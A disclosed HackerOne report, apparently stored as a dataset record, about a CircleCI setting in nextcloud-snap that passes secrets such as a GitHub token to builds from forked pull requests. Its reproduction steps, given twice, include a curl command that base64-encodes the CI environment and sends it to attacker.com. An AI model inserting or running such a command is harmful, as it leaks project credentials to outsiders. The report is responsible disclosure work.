{
    "reported_to": "Nextcloud",
    "reported_by": "nathand ",
    "title": "nextcloud-snap CircleCI project has vulnerable configuration which can lead to exposing secrets",
    "content": "\nSummary:\nCircleCI allows projects to configure whether builds will run as a result of a pull request from a fork, and also whether these fork PRs have access to the secrets stored in the parent repo's CircleCI settings. When both settings are enabled, and the repo associated with the project allows PRs to come from forks from any user (which Github always allows), then a CircleCI project is vulnerable to leaking secrets. Please see the following for documentation on this:\nhttps://circleci.com/docs/2.0/oss/#pass-secrets-to-builds-from-forked-pull-requests\nParticularly:\nIf you are comfortable sharing secrets with anyone who forks your project and opens a PR, you can enable the Pass secrets to builds from forked pull requests option\nI believe the nextcloud/nextcloud-snap CircleCI project is configured in a vulnerable state, where both these settings are enabled. To determine this, I have developed an automated technique to query CircleCI projects for various non-sensitive settings including whether secrets are being passed to PRs from forks, although an attacker may be able to determine this by manually inspecting the build logs of fork PRs to the project for signs of credential use, or by simply doing a spray-n-pray, i.e., send in a malicious PR and hope for the best. You can confirm this by accessing the CircleCI dashboard, selecting the nextcloud/nextcloud-snap project, clicking on the Settings icon (right side, little cog icon), choosing \"Advanced Settings\", and scrolling down to \"Build forked pull requests\" (should be \"On\") and \"Pass secrets to builds from forked pull requests\" (should be \"On\").\nInspecting the .circleci/config.yml file for this repo suggests that there may not be any secret values being used, however if you go to a build job such as this one:\nhttps://circleci.com/gh/nextcloud/nextcloud-snap/4537\nThen expand the \"Preparing Environment Variables\" section, and scroll down to \"Using environment variables from project settings and/or contexts\", you can see that the CircleCI environment has access to GH_AUTH_TOKEN, which I'm assuming is a Github auth token. Assuming the worst, and this token grants a high level of access, its exposure using the technique outlined in this report could lead to malicious code being injected into Nextcloud repos, access to private repos etc.\nFYI, utilizing CircleCI Contexts may have prevented this configuration from being an issue, however my analysis of the CircleCI config file in this report suggests that Contexts is not being used.\nhttps://circleci.com/docs/2.0/contexts/\nPlease note: I did not submit any real pull requests to confirm this vulnerability, as I did not want to potentially tip off real attackers, as it would be hard to conduct a proof of concept in a public PR without also risking revealing the vulnerability. However my testing on CircleCI is fairly conclusive that these two configuration settings being enabled are vulnerable.\nWith that said, I'm willing to help prove this vulnerability in a more private environment, such as a private Nextcloud Github repository that is configured for CircleCI builds with the same vulnerable configuration outlined in this, which I have access to submit PRs to. The permission model on Github really has no bearing on this vulnerability from what I can tell, so I believe this would be a faithful representation of the vulnerability, without exposing the technique publicly. My Github username is ndavison if you wish to do this.\nSteps To Reproduce:\nFork the nextcloud/nextcloud-snap repo to a user (e.g. so it ends up as https://github.com/USER/nextcloud-snap).\nCreate a new branch in the fork, and modify the .circleci/config.yml file so environment variables are exfiltrated, e.g. add - run: curl https://attacker.com/?env=$(env | base64 | tr -d '\\n') to a CircleCI step that is executed during the CI build.\nSend the branch in as a PR to nextcloud/nextcloud-snap.\nWatch the web logs on attacker.com and wait for the environment variables stored in the CircleCI nextcloud/nextcloud-snap project to arrive via the query string.\nSupporting Material/References:\nPlease see the attached screenshot (circleci-vulnerable-config.png) of the vulnerable configuration state (when visiting \"Advanced Settings\" for a project in the CircleCI dashboard)\nImpact\nBy abusing the CircleCI configuration for the project, an attacker would be able to leak environment variables, deployment keys, and other credentials stored within the CircleCI project's settings. In this case it looks like the project might have access to a Github access token.\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "Insufficiently Protected Credentials"
    ],
    "screenshots": {},
    "disclosed_date": 1611942000,
    "report_url": "https://hackerone.com/reports/794407",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "HIGH",
    "vuln_category": "CODE",
    "steps": [
        [
            1,
            "Fork the nextcloud/nextcloud-snap repo to a user (e.g. so it ends up as https://github.com/USER/nextcloud-snap)."
        ],
        [
            2,
            "Create a new branch in the fork, and modify the .circleci/config.yml file so environment variables are exfiltrated, e.g. add - run: curl https://attacker.com/?env=$(env | base64 | tr -d '\\n') to a CircleCI step that is executed during the CI build."
        ],
        [
            3,
            "Send the branch in as a PR to nextcloud/nextcloud-snap."
        ],
        [
            4,
            "Watch the web logs on attacker.com and wait for the environment variables stored in the CircleCI nextcloud/nextcloud-snap project to arrive via the query string."
        ]
    ],
    "vuln_description": "The vulnerability involves a misconfiguration in CircleCI for the nextcloud-snap project, where builds from forked pull requests are allowed to access secrets from the parent repository. This can lead to exposure of sensitive environment variables like GH_AUTH_TOKEN, potentially allowing attackers to inject malicious code or access private repositories.",
    "reason": "The vulnerability requires understanding CircleCI's configuration settings and how they interact with GitHub's PR system. The attacker must know to check for specific settings in CircleCI and how to exploit them through a forked PR, which involves multiple components but is straightforward once the configuration is understood.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}